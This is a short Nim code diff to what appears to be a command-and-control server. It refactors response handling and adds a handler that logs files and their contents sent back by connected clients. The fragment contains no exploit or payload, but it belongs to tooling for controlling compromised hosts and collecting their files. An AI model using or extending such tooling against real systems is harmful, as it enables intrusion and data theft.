@@ -24,9 +24,11 @@ proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: C2Client) {
       server.clients[client.id].isAdmin = task["isAdmin"].getBool()
     of "output":
       logClientOutput client, task["category"].getStr(), task["output"].getStr()
-      if not server.clRespFuture.isNil():
-        server.clRespFuture[].complete()
-        server.clRespFuture[] = nil
+      await client.completeResponse()
+    of "file":
+      infoLog "received file " & task["path"].getStr() & " from " & $client
+      logClientOutput client, "DOWNLOAD", task["contents"].getStr()
+      await client.completeResponse()
 
 proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.async.} =
   let id = len(server.tcpListeners)
